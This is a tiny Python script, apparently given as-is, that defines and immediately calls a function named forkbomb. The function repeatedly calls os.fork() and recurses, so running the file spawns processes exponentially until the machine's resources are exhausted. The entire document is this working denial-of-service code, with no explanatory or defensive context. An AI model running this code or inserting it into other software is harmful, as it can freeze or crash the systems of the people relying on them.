import os
def forkbomb():
  os.fork() 
  forkbomb()
forkbomb()
